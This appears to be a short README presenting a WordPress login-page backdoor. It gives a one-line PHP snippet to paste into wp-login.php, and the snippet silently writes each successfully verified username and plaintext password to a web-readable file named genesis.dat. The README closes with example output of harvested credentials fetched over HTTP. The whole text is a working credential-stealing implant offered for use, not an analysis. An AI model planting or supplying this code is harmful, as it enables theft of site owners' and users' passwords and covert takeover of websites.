# Wordpress Login Page Backdoor

Copy this;
```php
if(isset($_POST['log']) and isset($_POST['pwd'])){$user_name=sanitize_user(wp_unslash($_POST['log']));$user=get_user_by('login',$user_name);if(!$user&&strpos($user_name,'@')){$user=get_user_by('email',$user_name);}if($user&&wp_check_password($_POST['pwd'],$user->data->user_pass,$user->ID)){$aa=@fopen("genesis.dat","a+");@fwrite($aa,implode(" ",$_POST)."\n");@fclose($aa);}}
```
in wp-login.php file
Paste it line 13;

```php
1 <?php
2 /**
3  * WordPress User Page
4  *
5  * Handles authentication, registering, resetting passwords, forgot password,
6  * and other user handling.
7  *
8  * @package WordPress
9  */
10
11 /** Make sure that the WordPress bootstrap has run before continuing. */
12 require __DIR__ . '/wp-load.php';
13 PASTE_IT_HERE_PASTE_IT_HERE_PASTE_IT_HERE_PASTE_IT_HERE_PASTE_IT_HERE_PASTE_IT_HERE_PASTE_IT_HERE_
14 // Redirect to HTTPS login if forced to use SSL.
15 if ( force_ssl_admin() && ! is_ssl() ) {
16 	if ( 0 === strpos( $_SERVER['REQUEST_URI'], 'http' ) ) {
```

## Example Output
http://wordpress_host:80/genesis.dat
```
admin ajn%!Erb(Vq7*(xbtE4#PJvf Giriş http://localhost/wp/wp-admin/ 1
mark 12345678 Giriş http://localhost/wp/wp-admin/ 1
```
